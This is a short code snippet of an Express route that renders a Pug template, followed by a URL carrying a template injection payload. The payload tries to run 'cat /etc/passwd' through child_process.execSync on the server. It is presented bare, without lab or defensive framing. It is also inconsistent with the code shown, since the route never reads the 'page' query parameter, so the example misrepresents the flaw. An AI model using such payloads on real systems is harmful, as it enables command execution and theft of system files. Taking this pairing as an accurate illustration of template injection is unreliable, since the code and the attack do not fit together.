source code:

```
app.get('/product/:id', function(req, res) {
    var productId = req.params.id;
    var product = getProductById(productId);

    var source = `
        html
            body
                h1= page
                h2= product.name
                p= product.description
                p Price: #{product.price}
    `;

    var template = pug.compile(source);
    var context = {
        product: product,
        page: 'Product Detail'
    };
    var html = template(context);

    res.send(html);
});
```

```http://localhost:5000/product/1?page=|process.mainModule.require('child_process').execSync('cat /etc/passwd')|```
